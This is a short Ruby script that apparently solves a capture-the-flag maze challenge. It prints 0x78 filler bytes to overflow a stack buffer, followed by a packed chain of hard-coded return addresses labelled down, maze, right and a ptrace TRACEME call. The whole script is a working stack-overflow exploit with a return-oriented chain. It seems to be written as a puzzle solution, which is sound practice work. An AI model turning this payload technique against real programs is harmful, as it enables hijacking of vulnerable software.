#!/usr/bin/env ruby

get_input_stack_size = 0x78
right=0x111e0
down=0x11280
maze=0x11100
ptrace=0x1142b # the TRACEME one, with arguments set up first

print "A"*get_input_stack_size
print [down,maze,down,maze,right,maze,right,maze,right,maze,ptrace].pack("Q*")
